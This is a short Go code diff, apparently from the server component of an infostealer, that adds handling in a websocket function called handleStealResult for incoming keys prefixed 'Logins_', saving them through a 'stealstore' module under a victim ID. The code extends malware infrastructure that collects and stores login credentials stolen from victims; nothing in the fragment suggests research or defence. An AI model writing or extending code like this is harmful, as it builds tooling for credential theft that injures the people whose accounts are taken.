@@ -354,6 +354,12 @@ func (h *Hub) handleStealResult(ws *websocket.Conn, payload map[string]any) {
 			}
 			continue
 		}
+		if strings.HasPrefix(key, "Logins_") {
+			if err := stealstore.SaveLogins(victimID, key, value); err != nil {
+				log.Printf("[ws] steal logins error %s/%s: %v", victimID, key, err)
+			}
+			continue
+		}
 		if value == "" {
 			continue
 		}
